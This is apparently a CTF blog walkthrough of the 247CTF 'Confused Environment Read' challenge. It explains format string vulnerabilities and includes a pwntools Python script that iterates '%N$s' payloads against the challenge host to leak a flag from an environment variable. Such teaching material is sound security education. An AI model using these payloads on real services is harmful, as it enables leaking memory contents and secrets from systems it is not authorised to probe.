---
title: "247CTF - Confused Environment Read"
date: 2021-02-23
categories: [247ctf, ctf]
image: /images/247ctf/logo_0.png
tags: [247ctf, assembly, ctf, tutorial, walkthrough, debug, reverse engineering, exploiting, pwn, binary exploitation, confused environment read, format string]
description: 247CTF Confused Environment Read (PWN) challenge explained in detail. We will see how to solve the challenge and understand the underlying concepts.
hasComments: true
---

![247ctf0](/images/247ctf/pwnable/confused_environment_read/description.png)

This binary exploitation challenge is, at the moment of writing this walkthrough, rated as *EASY* with a difficulty score of 2.22 out of 5.0. Its description states the following:

> Can you abuse our confused environment service to read flag data hidden in an environment variable?

There is no binary to download and reverse this time. Instead, we are given a URL and a port to connect to. In order to connect, I'll be using [netcat](https://en.wikipedia.org/wiki/Netcat) along with [rlwrap](https://github.com/hanslub42/rlwrap). In case you are wondering what rlwrap does, it basically wraps the readline commands and allows a user to use arrow keys with commands line netcat, avoiding the annoying and infamous `^[[D^[[A` and such. 

Connecting to the challenge is as easy as `rlwrap nc URL PORT`

<p align="center">
	<img src="/images/247ctf/pwnable/confused_environment_read/execution.png">
</p>

Given that we can only interact with the execution of the binary and we have no idea what the source code is, the natural step to follow is to try several inputs and see if it breaks, looking for possible vulnerabilities. As shown in the image above, the binary is vulnerable to [**FORMAT STRING**](https://en.wikipedia.org/wiki/Printf_format_string). There are several <yellow>very good</yellow> technical papers or articles about the format string vulnerability, I'll link some:

- Format string vulns in gory detail, by Ron Bowes. [Link](https://blog.skullsecurity.org/2015/defcon-quals-babyecho-format-string-vulns-in-gory-detail)
- Exploiting Format String vulnerabilities, by scut from Team Teso. [Link](https://cs155.stanford.edu/papers/formatstring-1.2.pdf)
- Format string exploitation tutorial, by Saif El-Sherei. [Link](https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf)
- Exploit 101 - Format Strings, by Alexandre Cheron. [Link](https://axcheron.github.io/exploit-101-format-strings/)
- Format string attack, by OWASP. [Link](https://owasp.org/www-community/attacks/Format_string_attack)
- Format string exploitation, by Fuzzysecurity. [Link](https://www.fuzzysecurity.com/tutorials/expDev/10.html)
- Format string vulnerability, by Syracuse University. [Link](http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf)
- This one is also very good, but in Spanish. [Link](https://fundacion-sadosky.github.io/guia-escritura-exploits/format-string/5-format-string.html)

You can also learn about format string in video format, [LiveOverflow](https://www.youtube.com/results?search_query=liveoverflow+format+string)'s videos on the topic are very recommended.

I will briefly introduce the format string vulnerability so everyone reading this can understand what is actually happening. If you want to go deeper into the topic, please read the articles linked above. 

A format string vulnerability happens when a printing function, like `printf`, that works with format specifiers, like `%d`, is misused. That is, the parameters passed to the function do not follow its intended behavior.

For example, a correct use of the `printf` function is: `printf("Your name is %s", name);`, while the following example is vulnerable to format string: `printf(name);`. Imagine if the variable `name` is controlled by the user. A given user could input things like `%s` or `%x` (or any valid format specifier). The result would be memory leaking, abusing the format string vulnerability. 

Basically, the vulnerability happens because `printf` (and all of the functions within the family) have a variable number of arguments. The number of arguments is defined by the number of format specifiers (characters starting with `%`) within the format string itself. That is, a format string like `printf("Exploit %s, not %s.", "code", "people");` will expect two arguments and the function will retrieve them from the stack regardless the correctness of its invocation. In other words, the statement `printf("%x%x%x%x");` will print 4 arguments from the stack as hexadecimal, even though they were not specified when calling the function. 

There are several format specifiers we can use to leak information from the stack. In fact, `printf` family functions work with _format specifiers_, and several sub-specifiers like _flags_, _width_, _precision_ or _length_ following the `%[flags][width][.precision][length]specifier` pattern. I recommend you to read this [documentation](https://www.cplusplus.com/reference/cstdio/printf/) to find out all the valid specifiers. The next image shows the most common __format specifiers__ when exploiting a format string vulnerability ([Source](https://cs155.stanford.edu/papers/formatstring-1.2.pdf)).

<p align="center">
	<img src="/images/247ctf/pwnable/confused_environment_read/format_string_specifiers.png">
</p>

Please note that some specifiers work with pointers. That is, they expect a pointer and, as such, they will _dereference_ (or try to) the address they point to.

Leveraging a format string vulnerability to leak memory data is possible because functions assume the stack is configured according to the number of format specifiers they will read from the stack.  

Specifically, stack's behavior when exploiting the vulnerability is shown in the image below. ([Source](http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf))

<p align="center">
	<img src="/images/247ctf/pwnable/confused_environment_read/stack_format_string.png">
</p>

In order to depict the behavior of the stack and the internal `printf`'s pointer, I drawn the next figure. Please bear in mind that the behavior of the function is the same, regardless of the vulnerability. What differs is the intended data being printed or the actual leaking of information.

<p align="center">
	<img src="/images/247ctf/pwnable/confused_environment_read/stack_format_string_explained_by_razvi.png">
</p>


Another important thing to note is that `printf` functions allow the use of [positional parameters](https://stackoverflow.com/questions/6322540/how-do-positional-arguments-like-1-work-with-printf).

Now, sticking to our challenge, in order to abuse the vulnerability and leak memory contents, we can make use of the positional specifier and the string format specifier. As it was aforementioned, the `%s` format specifier expects a pointer to a string. That is, the address will be dereferenced and if it is invalid, the program will crash (*netcat connection will close*). 

Since we don't control what addresses are placed on the stack and neither can we debug it, my approach was to simply leak each and every address from the stack. That is, iterate and step through every position following the next pattern: `%{index}$s` where `index starts at 1`. In the next execution, `index = index + 1` and so forth. This pattern translated to a format specifier with the corresponding positional argument is as simple as `$1$x`.

```python
# RazviOverflow
# Python3

from pwn import *

# Iterate through positions 1 to 199
for index in range(1,200):
	payload = "%{}$s".format(index)

	# Establish connection
	binary = remote("05c9615dee1c25eb.247ctf.com", 50262)
	binary.recv()
	binary.sendline(payload)
	response = binary.recv()

	# In case there is en error or EOF is received, 
	# we close connection and continue leaking next position
	try:
		if b"247CTF" in response:
			print("[+] Found flag at position {}.".format(index))
			print(response)
			break
	except Exception as ex:
		binary.close()
```

Executing the exploit that abuses the vulnerability and leaks the memory, we will eventually leak the corresponding environment variable.

<p align="center">
	<img src="/images/247ctf/pwnable/confused_environment_read/exploited.png">
</p>

I hope you enjoyed my write-up. I'd be delighted to know whether it helped you progress and learn new things. Do not hesitate to reach me out via [Twitter](https://twitter.com/Razvieu). I'm always eager to learn new things and help others out :)

## More challenges
* Click [here](/247ctf) to see 247CTF index.